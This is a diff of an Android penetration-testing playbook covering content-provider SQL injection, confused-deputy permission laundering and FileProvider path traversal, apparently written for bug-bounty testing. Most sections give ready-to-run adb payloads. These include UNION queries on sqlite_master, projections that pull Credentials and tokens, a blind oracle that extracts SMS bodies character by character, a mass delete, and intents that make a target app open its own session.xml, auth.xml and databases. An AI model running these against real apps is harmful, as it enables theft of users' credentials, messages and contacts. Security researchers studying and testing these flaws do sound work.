+| **Maps to** | MASTG-TEST-0339, MASTG-TEST-0025 (deprecated upstream, superseded by MASTG-TEST-0339), MASWE-0050 (CWE-89, CWE-20), MASTG-KNOW-0117, rule `mastg-android-sql-injection-contentprovider.yml`, MASTG-TOOL-0110; H1 #291764 (Nextcloud, Low 0.9, $150), #1650264 (ownCloud, Medium 4.2, GHSL-2022-059), #887968 (Mail.ru `ru.mail.data.contact.ContactsProvider`), #143280 (Mail.ru, $250) |
 
 - **Test:** Establish that your string reaches SQL, then break it. A vulnerable provider's error leaks the
   real table name, the full column list **and the parenthesisation of the provider's own `WHERE` wrapper**
@@ -1406,19 +1478,19 @@ val sameFile = pfdStat.st_dev == canonicalFileStat.st_dev && pfdStat.st_ino == c
 ```bash
 A=content://com.target.app.provider/notes/
 # 1. does it reach SQL at all?
-adb shell content query --uri $A --where "_id=1"
+adb -s "$SERIAL" shell "content query --uri $A --where \"_id=1\""
 # 2. break it
-adb shell content query --uri $A --where "'"
+adb -s "$SERIAL" shell "content query --uri $A --where \"'\""
 # 3. UNION, balancing the provider's own "WHERE (" wrapper
-adb shell content query --uri $A --where "_id=1=1)union select 1,2,3,4,sqlite_version(),6,7,8 from sqlite_master where (1=1"
-adb shell content query --uri $A --where "_id=1=1)union select 1,2,3,4,tbl_name,6,7,8 from sqlite_master where (1=1"
-adb shell content query --uri $A --where "_id=1=1)union select 1,2,3,4,sql,6,7,8 from sqlite_master where (1=1"
+adb -s "$SERIAL" shell "content query --uri $A --where \"_id=1=1)union select 1,2,3,4,sqlite_version(),6,7,8 from sqlite_master where (1=1\""
+adb -s "$SERIAL" shell "content query --uri $A --where \"_id=1=1)union select 1,2,3,4,tbl_name,6,7,8 from sqlite_master where (1=1\""
+adb -s "$SERIAL" shell "content query --uri $A --where \"_id=1=1)union select 1,2,3,4,sql,6,7,8 from sqlite_master where (1=1\""
 # generic boolean form when the wrapper shape is unknown
-adb shell content query --uri $A --where "1=1) OR (1=1"
-adb shell content query --uri $A --where "1=2 UNION SELECT * FROM Sensitive -- "
+adb -s "$SERIAL" shell "content query --uri $A --where \"1=1) OR (1=1\""
+adb -s "$SERIAL" shell "content query --uri $A --where \"1=2 UNION SELECT * FROM Sensitive -- \""
 # static sink
-grep -rnE 'rawQuery\(|execSQL\(|SQLiteQueryBuilder|appendWhere\(|"\s*\+\s*selection' out/sources/
-grep -rn 'selectionArgs\|setStrict\|setProjectionMap' out/sources/   # absence is the bug
+grep -rnE 'rawQuery\(|execSQL\(|SQLiteQueryBuilder|appendWhere\(|"\s*\+\s*selection|SimpleSQLiteQuery\(|SupportSQLiteQuery|@RawQuery|getOpenHelper\(\)\.getReadableDatabase\(\)\.query\("|SupportSQLiteQueryBuilder' "$DEC/jadx/sources/"
+grep -rn 'selectionArgs\|setStrict\|setProjectionMap' "$DEC/jadx/sources/"   # absence is the bug (SQLiteQueryBuilder path only — Room has no setStrict*)
 ```
   `SQLiteQueryBuilder.appendWhere()` inserts its argument **verbatim** and is not parameterised;
   `appendWhereEscapeString` is the safe variant.
@@ -1431,9 +1503,11 @@ grep -rn 'selectionArgs\|setStrict\|setProjectionMap' out/sources/   # absence i
   path (D07-042) — read plus write is the Critical.
 - **Ruled out when:** Every caller-supplied string is passed through `selectionArgs` with `?` placeholders,
   **and** the quote probe returns rows or a clean empty cursor rather than a parser error, **and**
-  `setStrictColumns`/`setStrictGrammar` or a `setProjectionMap` is present. Note the reachability
-  qualifier: the same concatenation reachable only through the app's own UI is Low — you are injecting into
-  your own database.
+  `setStrictColumns`/`setStrictGrammar` or a `setProjectionMap` is present. On a Room-backed provider the
+  safe forms are `@Query` with bound parameters and `SimpleSQLiteQuery(sql, bindArgs)` with the caller's
+  values only in `bindArgs`; `setStrict*` does not exist on this path, so the proof is the decompiled
+  constructor call plus the quote probe returning a clean cursor. Note the reachability qualifier: the same
+  concatenation reachable only through the app's own UI is Low — you are injecting into your own database.
 
 ### D07-039 · Projection injection is a separate sink from selection
 
@@ -1453,11 +1527,11 @@ grep -rn 'selectionArgs\|setStrict\|setProjectionMap' out/sources/   # absence i
 ```bash
 A=content://com.target.app.provider/users
 # empty-projection probe leaks the query template
-adb shell content query --uri $A --projection ""
-adb shell content query --uri $A --projection "'"
-adb shell content query --uri $A --projection "* FROM sqlite_master WHERE type='table';--"
-adb shell content query --uri $A --projection "* FROM Credentials --"
-adb shell content query --uri $A --projection "(SELECT group_concat(value) FROM tokens)"
+adb -s "$SERIAL" shell "content query --uri $A --projection \"\""
+adb -s "$SERIAL" shell "content query --uri $A --projection \"'\""
+adb -s "$SERIAL" shell "content query --uri $A --projection \"* FROM sqlite_master WHERE type='table';--\""
+adb -s "$SERIAL" shell "content query --uri $A --projection \"* FROM Credentials --\""
+adb -s "$SERIAL" shell "content query --uri $A --projection \"(SELECT group_concat(value) FROM tokens)\""
 drozer> run app.provider.query content://com.target.app.provider/users --projection "* FROM KEY--;"
 drozer> run scanner.provider.sqltables -a com.target.app
 ```
@@ -1486,10 +1560,10 @@ drozer> run scanner.provider.sqltables -a com.target.app
 - **How:**
 ```bash
 A=content://com.target.app.provider/users
-adb shell content query --uri $A --sort "1--"
-adb shell content query --uri $A --sort "_id ASC--"
-adb shell content query --uri $A --sort "(CASE WHEN (SELECT count(*) FROM sqlite_master WHERE tbl_name='tokens')>0 THEN _id ELSE name END)"
-adb shell content query --uri $A --sort "_id LIMIT 1 OFFSET 0--"
+adb -s "$SERIAL" shell "content query --uri $A --sort \"1--\""
+adb -s "$SERIAL" shell "content query --uri $A --sort \"_id ASC--\""
+adb -s "$SERIAL" shell "content query --uri $A --sort \"(CASE WHEN (SELECT count(*) FROM sqlite_master WHERE tbl_name='tokens')>0 THEN _id ELSE name END)\""
+adb -s "$SERIAL" shell "content query --uri $A --sort \"_id LIMIT 1 OFFSET 0--\""
 ```
   The `CASE WHEN` form is a boolean oracle that needs no error message: the row ordering changes when the
   condition is true.
@@ -1516,12 +1590,12 @@ adb shell content query --uri $A --sort "_id LIMIT 1 OFFSET 0--"
   injectable read sits on before claiming it.
 - **How:**
 ```bash
-semgrep -c rules/mastg-android-sql-injection-contentprovider.yml out/sources/
-grep -rnE 'appendWhere\(|getPathSegments\(\)\.get\(|getLastPathSegment\(\)' out/sources/ | grep -iE 'where|query|_ID'
-adb shell content query --uri "content://com.target.app.provider/students/filter/1%20OR%201=1--"
-adb shell content query --uri "content://com.target.app.provider/users/1'%20OR%20'1'='1"
+semgrep -c rules/mastg-android-sql-injection-contentprovider.yml "$DEC/jadx/sources/"
+grep -rnE 'appendWhere\(|getPathSegments\(\)\.get\(|getLastPathSegment\(\)' "$DEC/jadx/sources/" | grep -iE 'where|query|_ID'
+adb -s "$SERIAL" shell content query --uri "content://com.target.app.provider/students/filter/1%20OR%201=1--"
+adb -s "$SERIAL" shell content query --uri "content://com.target.app.provider/users/1'%20OR%20'1'='1"
 # the ownCloud shape (GHSL-2022-059), where the path segment is concatenated in delete() too:
-adb shell content delete --uri content://org.owncloud/file/1 --where "1=1 OR '1'='1"
+adb -s "$SERIAL" shell "content delete --uri content://org.owncloud/file/1 --where \"1=1 OR '1'='1\""
 ```
 ```kotlin
 // vulnerable shape, verbatim
@@ -1556,13 +1630,13 @@ count = db.delete(ProviderTableMeta.FILE_TABLE_NAME,
 ```bash
 drozer> run app.provider.info -a com.target.app       # look for read set, write missing
 # co-location probe: does the sensitive table live in this DB file?
-adb shell content query --uri content://service-number/service_number \
-  --where '(SELECT COUNT(*) FROM (SELECT tbl_name FROM sqlite_master WHERE tbl_name = "sms"))>0'
+adb -s "$SERIAL" shell "content query --uri content://service-number/service_number \
+  --where \"(SELECT COUNT(*) FROM (SELECT tbl_name FROM sqlite_master WHERE tbl_name = 'sms'))>0\""
 # seed a row if update() would otherwise affect 0 rows
-adb shell content insert --uri content://service-number/service_number --bind hash_number:s:dummy
+adb -s "$SERIAL" shell content insert --uri content://service-number/service_number --bind hash_number:s:dummy
 # one blind bit
-adb shell content update --uri content://service-number/service_number --bind rowid:s:123 \
-  --where '1=1 AND unicode(substr((SELECT body FROM sms ORDER BY rowid DESC LIMIT 1),1,1)) BETWEEN 48 AND 57'
+adb -s "$SERIAL" shell "content update --uri content://service-number/service_number --bind rowid:s:123 \
+  --where \"1=1 AND unicode(substr((SELECT body FROM sms ORDER BY rowid DESC LIMIT 1),1,1)) BETWEEN 48 AND 57\""
 ```
   The oracle: TRUE if `update()` returns rows-affected > 0 **or** throws `UNIQUE constraint failed`; FALSE
   otherwise. Binary-search `[0..127]` per character with
@@ -1632,7 +1706,7 @@ WHERE (_id=? AND lookup=?)          -- the provider's ENTIRE grant enforcement
 | **Severity ceiling** | Support |
 | **VRT** | n/a (negative control) |
 | **Attacker** | AM-03 |
-| **Applies to** | Android builds exposing the compat change; `am compat` itself is Android 10+ |
+| **Applies to** | Android 11+ (`am compat` and the compatibility framework); on a user build `am compat enable` only works for a debuggable target package, so the PoC stub must be `android:debuggable="true"` |
 | **Requires** | provider, device |
 | **Maps to** | CVE-2026-28576 "The Patched Behavior"; compat change `ENFORCE_STRICT_SQL_CHECKS` id `484953293`, `enableAfterTargetSdk="36"`; `SQLiteQueryBuilder.setStrictGrammar()` |
 
@@ -1642,11 +1716,11 @@ WHERE (_id=? AND lookup=?)          -- the provider's ENTIRE grant enforcement
   by raising its own. Force the strict path on and re-run the identical query.
 - **How:**
 ```bash
-adb shell am compat enable 484953293 com.poc.stub
+adb -s "$SERIAL" shell am compat enable 484953293 com.poc.stub
 # Enabled change 484953293 for com.poc.stub.
 # re-run the exact payload from D07-043
-adb shell am compat disable 484953293 com.poc.stub
-adb shell am compat reset 484953293 com.poc.stub
+adb -s "$SERIAL" shell am compat disable 484953293 com.poc.stub
+adb -s "$SERIAL" shell am compat reset 484953293 com.poc.stub
 ```
 - **Proof:** The same app, same grant, same payload, now throwing
   `IllegalArgumentException: Invalid token SELECT` with the change enabled and returning the oracle result
@@ -1675,12 +1749,12 @@ adb shell am compat reset 484953293 com.poc.stub
 - **How:**
 ```bash
 # find two providers with different permission levels backed by one DB
-grep -rnE 'DATABASE_NAME|extends SQLiteOpenHelper|super\(context, *"' out/sources/ | sort -u
-grep -nE '<provider' -A6 out/AndroidManifest.xml | grep -E 'authorities|Permission'
-adb shell content query --uri content://com.target.app.insensitive/ \
-  --where "1=2 UNION SELECT * FROM Sensitive -- "
-adb shell content query --uri content://com.target.app.insensitive/ \
-  --where "1=1) UNION SELECT name,sql FROM sqlite_master--"
+grep -rnE 'DATABASE_NAME|extends SQLiteOpenHelper|super\(context, *"' "$DEC/jadx/sources/" | sort -u
+grep -nE '<provider' -A6 "$DEC/apktool/AndroidManifest.xml" | grep -E 'authorities|Permission'
+adb -s "$SERIAL" shell "content query --uri content://com.target.app.insensitive/ \
+  --where \"1=2 UNION SELECT * FROM Sensitive -- \""
+adb -s "$SERIAL" shell "content query --uri content://com.target.app.insensitive/ \
+  --where \"1=1) UNION SELECT name,sql FROM sqlite_master--\""
 ```
 ```java
 query(Uri.parse("content://com.target.app.insensitive/"), null,
@@ -1709,9 +1783,9 @@ query(Uri.parse("content://com.target.app.insensitive/"), null,
   the arms, read them, then test the gap.
 - **How:**
 ```bash
-grep -rn -A80 'mUriMatcher.match(\|sUriMatcher.match(' out/sources/ \
+grep -rn -A80 'mUriMatcher.match(\|sUriMatcher.match(' "$DEC/jadx/sources/" \
   | grep -nE 'case [A-Z_]+:|setProjectionMap|checkCall|getCallingPackage|appendWhere|throw '
-adb shell content query --uri content://org.nextcloud/file --projection "* from ocshares --"
+adb -s "$SERIAL" shell "content query --uri content://org.nextcloud/file --projection \"* from ocshares --\""
 ```
 - **Proof:** A row from a table that the branch was never meant to serve, e.g.
 ```
@@ -1780,7 +1854,7 @@ dz> run auxiliary.webcontentresolver --port 8080
     WebContentResolver started on port 8080.
 ```
 ```bash
-adb forward tcp:8080 tcp:8080
+adb -s "$SERIAL" forward tcp:8080 tcp:8080
 curl 'http://127.0.0.1:8080/query?uri=content://com.target.app.provider/users'
 curl 'http://127.0.0.1:8080/query?uri=content://com.target.app.provider/users&selection=1%3D1'
 # then proxy through Burp at 127.0.0.1:8080 and Intruder the selection parameter
@@ -1811,16 +1885,16 @@ curl 'http://127.0.0.1:8080/query?uri=content://com.target.app.provider/users&se
 - **How:**
 ```bash
 # (a) body diff, not status
-adb shell content query --uri "$A" --where "1=1" > /tmp/true.txt
-adb shell content query --uri "$A" --where "1=0" > /tmp/false.txt
+adb -s "$SERIAL" shell "content query --uri \"$A\" --where \"1=1\"" > /tmp/true.txt
+adb -s "$SERIAL" shell "content query --uri \"$A\" --where \"1=0\"" > /tmp/false.txt
 diff /tmp/true.txt /tmp/false.txt && echo "NO DIFFERENTIAL -> not an oracle"
 wc -l /tmp/true.txt /tmp/false.txt
 ```
 ```python
 # (b) n>=10 interleaved, randomised order, with the counts printed
-import random, subprocess, statistics
-def probe(where):
-    r = subprocess.run(["adb","shell","content","query","--uri",A,"--where",where],
+import random, subprocess, statistics, os, shlex
+def probe(where):   # shlex.join quotes the payload for the device shell; -s pins the device
+    r = subprocess.run(["adb","-s",os.environ["SERIAL"],"shell", shlex.join(["content","query","--uri",A,"--where",where])],
                        capture_output=True, text=True, timeout=30)
     return len(r.stdout.strip().splitlines())
 trials = [("T","1=1"),("F","1=0")]*10
@@ -1858,12 +1932,12 @@ for k,v in res.items():
   HTTP capture — for the marker string before claiming anything.**
 ```bash
 M="zq7x4kd9m2"                       # 10 chars, no dictionary words
-adb shell content query --uri "$A/users" > /tmp/baseline.txt
+adb -s "$SERIAL" shell content query --uri "$A/users" > /tmp/baseline.txt
 grep -c "$M" /tmp/baseline.txt        # MUST be 0
-adb shell content insert --uri "$A/users" --bind name:s:"$M" --bind role:s:admin
-adb shell content query  --uri "$A/users" | grep "$M"
+adb -s "$SERIAL" shell content insert --uri "$A/users" --bind name:s:"$M" --bind role:s:admin
+adb -s "$SERIAL" shell content query  --uri "$A/users" | grep "$M"
 # and, for the rendered/exfiltrated form:
-adb logcat -d | grep "$M"
+adb -s "$SERIAL" logcat -d | grep "$M"
 # check the proxy capture for the same marker before claiming the value reached the backend
 ```
 - **Proof:** The marker present in the post-write artefact and absent from the baseline, both shown. Never
@@ -1879,7 +1953,7 @@ adb logcat -d | grep "$M"
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) — argue P1/P2 on the permission re-delegation |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) — argue P1/P2 on the permission re-delegation |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
 | **Requires** | provider, device |
@@ -1892,11 +1966,11 @@ adb logcat -d | grep "$M"
 - **How:**
 ```bash
 # the sink: a ContentResolver call INSIDE a ContentProvider method
-grep -rnE 'getContentResolver\(\)\.(query|openInputStream|openOutputStream|openFileDescriptor|openAssetFileDescriptor|call)' out/sources/ \
+grep -rnE 'getContentResolver\(\)\.(query|openInputStream|openOutputStream|openFileDescriptor|openAssetFileDescriptor|call)' "$DEC/jadx/sources/" \
   | grep -inE 'uri\.getQueryParameter|Uri\.parse\(|getPathSegments|extras\.getString'
-adb shell content query --uri 'content://com.target.app.proxy/?uri=content%3A%2F%2Fcom.android.contacts%2Fdata%2Fphones'
-adb shell content query --uri 'content://com.target.app.proxy/?uri=content%3A%2F%2Fsms%2Finbox'
-adb shell content read  --uri 'content://com.target.app.proxy/r?m=content%3A%2F%2Fcom.android.contacts%2Fcontacts%2F1%2Fphoto'
+adb -s "$SERIAL" shell content query --uri 'content://com.target.app.proxy/?uri=content%3A%2F%2Fcom.android.contacts%2Fdata%2Fphones'
+adb -s "$SERIAL" shell content query --uri 'content://com.target.app.proxy/?uri=content%3A%2F%2Fsms%2Finbox'
+adb -s "$SERIAL" shell content read  --uri 'content://com.target.app.proxy/r?m=content%3A%2F%2Fcom.android.contacts%2Fcontacts%2F1%2Fphoto'
 ```
   Always run the two-step control: first the direct read from your no-permission app (must fail), then the
   same URI wrapped by the deputy.
@@ -1923,7 +1997,7 @@ fun wasGrantedPermission(ctx: Context, uri: Uri?, grantFlag: Int): Boolean =
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | apps holding a dangerous permission and exposing a provider |
 | **Requires** | provider, device |
@@ -1935,14 +2009,14 @@ fun wasGrantedPermission(ctx: Context, uri: Uri?, grantFlag: Int): Boolean =
   permission laundering. The same pattern appears as a cache file on shared storage.
 - **How:**
 ```bash
-grep -rnE 'ContactsContract|Telephony\.Sms|CallLog|CalendarContract|MediaStore' out/sources/ \
+grep -rnE 'ContactsContract|Telephony\.Sms|CallLog|CalendarContract|MediaStore' "$DEC/jadx/sources/" \
   | grep -inE 'ContentProvider|query\(|CursorLoader'
-grep -nE 'READ_CONTACTS|READ_SMS|READ_CALL_LOG|READ_CALENDAR|ACCESS_FINE_LOCATION' out/AndroidManifest.xml
-adb shell content query --uri content://com.target.app.contacts
-adb shell content query --uri content://com.target.app.provider/messages
+grep -nE 'READ_CONTACTS|READ_SMS|READ_CALL_LOG|READ_CALENDAR|ACCESS_FINE_LOCATION' "$DEC/apktool/AndroidManifest.xml"
+adb -s "$SERIAL" shell content query --uri content://com.target.app.contacts
+adb -s "$SERIAL" shell content query --uri content://com.target.app.provider/messages
 # the file variant of the same laundering
-grep -rnE 'MODE_WORLD_READABLE|setReadable\(true, *false\)|getExternalFilesDir|getExternalCacheDir' out/sources/
-adb shell ls -la /sdcard/Android/data/com.target.app/files /sdcard/Download 2>/dev/null
+grep -rnE 'MODE_WORLD_READABLE|setReadable\(true, *false\)|getExternalFilesDir|getExternalCacheDir' "$DEC/jadx/sources/"
+adb -s "$SERIAL" shell ls -la /sdcard/Android/data/com.target.app/files /sdcard/Download 2>/dev/null
 ```
 - **Proof:** Contact rows or SMS bodies returned to a test app declaring **no** contacts/SMS permission,
   with the app's own `<uses-permission>` line shown as the source of the access.
@@ -1951,8 +2025,11 @@ adb shell ls -la /sdcard/Android/data/com.target.app/files /sdcard/Download 2>/d
 - **Ruled out when:** The app holds no dangerous permission whose data it re-serves, or the provider
   enforces a `signature`-level permission on the re-serving path (verify the protectionLevel per D07-014).
   Note `MODE_WORLD_READABLE` throws from API 24 (**LEGACY**) and other apps cannot read
-  `Android/data/<pkg>` on Android 11+ without All-Files-Access — check the actual API level before rating
-  the file variant.
+  `Android/data/<pkg>` or `Android/obb/<pkg>` on Android 11+ at all — `MANAGE_EXTERNAL_STORAGE` excludes
+  them and Android 13 blocks SAF tree picks of them; only the shared collections (`Download/`, `Documents/`,
+  `Pictures/`, ...) remain cross-app readable (with the media permissions or via MediaStore). A shell `ls` of
+  `Android/data` proves nothing about AM-03 — re-check from the probe app, and check the actual API level
+  before rating the file variant.
 
 ### D07-053 · Fallback-response enumeration against a thumbnail or avatar deputy
 
@@ -1972,15 +2049,15 @@ adb shell ls -la /sdcard/Android/data/com.target.app/files /sdcard/Download 2>/d
 - **How:**
 ```bash
 # capture the fallback once
-adb shell content read --uri 'content://com.target.app.avatars/r?id=99999999' > /tmp/fallback.bin
-FB=$(sha256sum /tmp/fallback.bin | cut -d' ' -f1)
+adb -s "$SERIAL" shell content read --uri 'content://com.target.app.avatars/r?id=99999999' > /tmp/fallback.bin
+shasum -a 256 /tmp/fallback.bin | cut -d' ' -f1   # macOS/Linux; for the notes only, the harness recomputes it
 python3 - <<'PY'
-import subprocess, hashlib
+import subprocess, hashlib, os
 fb = hashlib.sha256(open('/tmp/fallback.bin','rb').read()).hexdigest()
 hits = 0; n = 0
 for i in range(1, 501):
     uri = f"content://com.target.app.avatars/r?id={i}"
-    r = subprocess.run(["adb","shell","content","read","--uri",uri],
+    r = subprocess.run(["adb","-s",os.environ["SERIAL"],"shell","content","read","--uri",uri],
                        capture_output=True, timeout=20)
     h = hashlib.sha256(r.stdout).hexdigest(); n += 1
     if r.stdout and h != fb:
@@ -2011,15 +2088,16 @@ PY
   — the app becomes the exfiltration channel for its own secrets.
 - **How:**
 ```bash
-grep -rn -B6 'openInputStream\|openOutputStream\|openFileDescriptor\|openAssetFileDescriptor' out/sources/ \
+grep -rn -B6 'openInputStream\|openOutputStream\|openFileDescriptor\|openAssetFileDescriptor' "$DEC/jadx/sources/" \
   | grep -inE 'getIntent\(\)|getData\(\)|EXTRA_STREAM|getParcelableExtra|getQueryParameter'
-adb shell am start -n com.target.app/.ImportActivity -a android.intent.action.VIEW \
+adb -s "$SERIAL" shell am start -n com.target.app/.ImportActivity -a android.intent.action.VIEW \
   -d 'file:///data/data/com.target.app/shared_prefs/session.xml'
-adb shell am start -n com.target.app/.ImportActivity \
+adb -s "$SERIAL" shell am start -n com.target.app/.ImportActivity \
   --eu android.intent.extra.STREAM 'file:///data/data/com.target.app/databases/app.db'
-# symlink variant
-adb shell 'ln -s /data/data/com.target.app/shared_prefs/secrets.xml /sdcard/Android/data/com.poc/files/pic.jpg'
-adb shell am start -n com.target.app/.ImportActivity -d file:///sdcard/Android/data/com.poc/files/pic.jpg
+# symlink variant — lab control only: external storage refuses symlinks (EPERM) and Android 12+ per-app SELinux
+# categories stop the victim opening another app's data directory; the race procedure is D11-049
+adb -s "$SERIAL" shell 'ln -s /data/data/com.target.app/shared_prefs/secrets.xml /data/local/tmp/pic.jpg'
+adb -s "$SERIAL" shell am start -n com.target.app/.ImportActivity -d file:///data/local/tmp/pic.jpg   # shell UID, not AM-03
 ```
 - **Proof:** The victim uploads, attaches or renders its own private file. Capture the outbound HTTP request
   body in the proxy containing `session.xml` or the `SQLite format 3` header — that request is the proof,
@@ -2042,7 +2120,7 @@ boolean ok = real.startsWith(Paths.get(ctx.getApplicationInfo().dataDir));
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
 | **Requires** | device |
@@ -2053,10 +2131,10 @@ boolean ok = real.startsWith(Paths.get(ctx.getApplicationInfo().dataDir));
   manifest see a MIME filter and assume a scheme constraint that is not there.
 - **How:**
 ```bash
-xmllint --format out/AndroidManifest.xml | grep -n '<data' | grep mimeType | grep -v scheme
-adb shell am start -n com.target.app/.Viewer -a android.intent.action.VIEW \
+xmllint --format "$DEC/apktool/AndroidManifest.xml" | grep -n '<data' | grep mimeType | grep -v scheme
+adb -s "$SERIAL" shell am start -n com.target.app/.Viewer -a android.intent.action.VIEW \
   -t image/png -d 'file:///data/data/com.target.app/databases/app.db'
-adb shell am start -a android.intent.action.SEND -t 'image/*' \
+adb -s "$SERIAL" shell am start -a android.intent.action.SEND -t 'image/*' \
   --eu android.intent.extra.STREAM 'file:///data/data/com.target.app/shared_prefs/auth.xml' \
   -n com.target.app/.ShareTarget
 ```
@@ -2082,13 +2160,13 @@ adb shell am start -a android.intent.action.SEND -t 'image/*' \
   provider. Point any URI sink in the app at its own non-exported authority, with a traversal payload.
 - **How:**
 ```bash
-grep -nE 'android:exported="false"' -B4 out/AndroidManifest.xml | grep -A4 '<provider'
+grep -nE 'android:exported="false"' -B4 "$DEC/apktool/AndroidManifest.xml" | grep -A4 '<provider'
 # find any externally-reachable path where a Uri arrives and is opened
-grep -rnE 'getParcelableExtra\([^)]*Uri|intent\.getData\(\)|getQueryParameter\("(uri|url|file|path|src)"\)' out/sources/
+grep -rnE 'getParcelableExtra\([^)]*Uri|intent\.getData\(\)|getQueryParameter\("(uri|url|file|path|src)"\)' "$DEC/jadx/sources/"
 # then aim it at the app's own internal authority
-adb shell am start -n com.target.app/.ImportActivity -a android.intent.action.VIEW \
+adb -s "$SERIAL" shell am start -n com.target.app/.ImportActivity -a android.intent.action.VIEW \
   -d 'content://com.target.app.internal/secrets/1'
-adb shell am start -n com.target.app/.ImportActivity \
+adb -s "$SERIAL" shell am start -n com.target.app/.ImportActivity \
   --eu android.intent.extra.STREAM 'content://com.target.app.internal/../../shared_prefs/auth.xml'
 ```
 - **Proof:** The app copies its own private file into public storage, attaches it to an outbound message,
@@ -2105,7 +2183,7 @@ adb shell am start -n com.target.app/.ImportActivity \
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `server_side_injection.file_inclusion.local` (P1) when reachable; `server_security_misconfiguration.path_traversal` (VARIES) for the configuration |
+| **VRT** | `server_side_injection.file_inclusion.local` (P1) when reachable; `server_security_misconfiguration.path_traversal` (varies) for the configuration |
 | **Attacker** | AM-03 (needs an exported provider or a grant primitive) |
 | **Applies to** | all apps declaring a FileProvider |
 | **Requires** | provider |
@@ -2128,13 +2206,13 @@ adb shell am start -n com.target.app/.ImportActivity \
 - **How:**
 ```bash
 xmlstarlet sel -t -m "//provider/meta-data[@android:name='android.support.FILE_PROVIDER_PATHS']" \
-  -v "../@android:authorities" -o " -> " -v "@android:resource" -n out/AndroidManifest.xml
-cat out/res/xml/*paths*.xml out/res/xml/*file*path*.xml 2>/dev/null
+  -v "../@android:authorities" -o " -> " -v "@android:resource" -n "$DEC/apktool/AndroidManifest.xml"
+cat "$DEC/apktool/res/xml/"*paths*.xml "$DEC/apktool/res/xml/"*file*path*.xml 2>/dev/null
 python3 - <<'PY'
 import glob, re, xml.dom.minidom as m
 TAGS = ('root-path','files-path','cache-path','external-path','external-files-path',
         'external-cache-path','external-media-path')
-for f in glob.glob('out/res/xml/*.xml'):
+for f in glob.glob('"$DEC/apktool/res/xml/"*.xml'):
     try: d = m.parse(f)
     except Exception: continue
     for t in TAGS:
@@ -2144,17 +2222,22 @@ for f in glob.glob('out/res/xml/*.xml'):
                 print('DANGEROUS', f, t, 'name=' + n.getAttribute('name'), 'path=' + repr(p))
 PY
 # then read through it
-adb shell content read --uri 'content://com.target.app.fileprovider/root/data/data/com.target.app/shared_prefs/auth.xml'
-adb shell content read --uri 'content://com.target.app.fileprovider/files/../databases/app.db' | head -c 64 | xxd
+adb -s "$SERIAL" shell content read --uri 'content://com.target.app.fileprovider/root/data/data/com.target.app/shared_prefs/auth.xml'
+adb -s "$SERIAL" shell content read --uri 'content://com.target.app.fileprovider/files/../databases/app.db' | head -c 64 | xxd
 ```
 - **Proof:** The XML line itself, **plus** a `content read` returning bytes the feature never intended to
   share — `<string name="access_token">` from `shared_prefs`, or `SQLite format 3` from `databases/`. The
-  config alone is Medium at best; the read is the finding.
+  config alone is Medium at best; the read is the finding. If the first 16 bytes are random, check for
+  SQLCipher (`net.sqlcipher`, `SQLiteDatabase.loadLibs`, `SupportFactory` in `$DEC/jadx/sources`) — an
+  encrypted database starts with a 16-byte salt, not the magic; the read is still proven by the byte count
+  matching `run-as ls -l`, and the payload is rated on what the key derivation allows (D11).
 - **Escalation:** -> D08 to obtain the grant if the provider is not exported; -> D11/D13 for the payload;
   -> D17 if `openFile` also honours `"w"` and the reachable tree contains a code path.
 - **Ruled out when:** Every element names a specific subdirectory (`<files-path name="shared" path="shared/"/>`)
   and none is `root-path` or `path` in `{"", ".", "/"}` — and a probe for a sibling directory returns
-  `IllegalArgumentException: Failed to find configured root that contains ...`.
+  `IllegalArgumentException: Failed to find configured root that contains ...`. For a non-exported
+  FileProvider the probe needs a grant path, so the row is `blocked: D08 census incomplete` until the D08
+  redirector/grant census has run (D07-025).
 
 ### D07-058 · `<external-path>` and the shared-volume exposure
 
@@ -2172,11 +2255,12 @@ adb shell content read --uri 'content://com.target.app.fileprovider/files/../dat
   served *by the provider* — which launders attacker content into the app's own trusted authority.
 - **How:**
 ```bash
-grep -rn 'external-path\|external-files-path\|external-media-path' out/res/xml/
-adb shell ls -la /sdcard/Android/data/com.target.app/files /sdcard/Download
+grep -rn 'external-path\|external-files-path\|external-media-path' "$DEC/apktool/res/xml/"
+adb -s "$SERIAL" shell ls -la /sdcard/Android/data/com.target.app/files /sdcard/Download
+# the shell sees Android/data/<pkg>; another app cannot (Android 11+, even with MANAGE_EXTERNAL_STORAGE) — only the shared collections count for AM-03
 # write into the mapped directory from a second app, then read it back through the victim's authority
-adb shell 'echo zq7x4kd9m2 > /sdcard/Download/planted.txt'
-adb shell content read --uri 'content://com.target.app.fileprovider/external/Download/planted.txt'
+adb -s "$SERIAL" shell 'echo zq7x4kd9m2 > /sdcard/Download/planted.txt'
+adb -s "$SERIAL" shell content read --uri 'content://com.target.app.fileprovider/external/Download/planted.txt'
 ```
 - **Proof:** Your planted marker returned through the victim's authority, or a per-user document (invoice,
   KYC image, chat attachment) readable at rest on the shared volume.
@@ -2203,13 +2287,13 @@ adb shell content read --uri 'content://com.target.app.fileprovider/external/Dow
   call succeeds for.
 - **How:**
 ```bash
-grep -rn 'getUriForFile(' out/sources/
+grep -rn 'getUriForFile(' "$DEC/jadx/sources/"
 # for each hit, trace the File argument backwards in jadx to its source
-grep -rn -B12 'getUriForFile(' out/sources/ \
+grep -rn -B12 'getUriForFile(' "$DEC/jadx/sources/" \
   | grep -inE 'getQueryParameter|getStringExtra|getPathSegments|DISPLAY_NAME|getData\(\)'
-adb shell am start -n com.target.app/.ShareActivity \
+adb -s "$SERIAL" shell am start -n com.target.app/.ShareActivity \
   --es filename '../databases/app.db'
-adb shell am start -W -a android.intent.action.VIEW \
+adb -s "$SERIAL" shell am start -W -a android.intent.action.VIEW \
   -d 'targetapp://share?file=..%2F..%2Fshared_prefs%2Fauth.xml'
 ```
 - **Proof:** A deep link or intent that makes the app mint a URI for a path you chose, grant it to you, and
@@ -2238,12 +2322,12 @@ adb shell am start -W -a android.intent.action.VIEW \
   reachable half credible to a triager.
 - **How:**
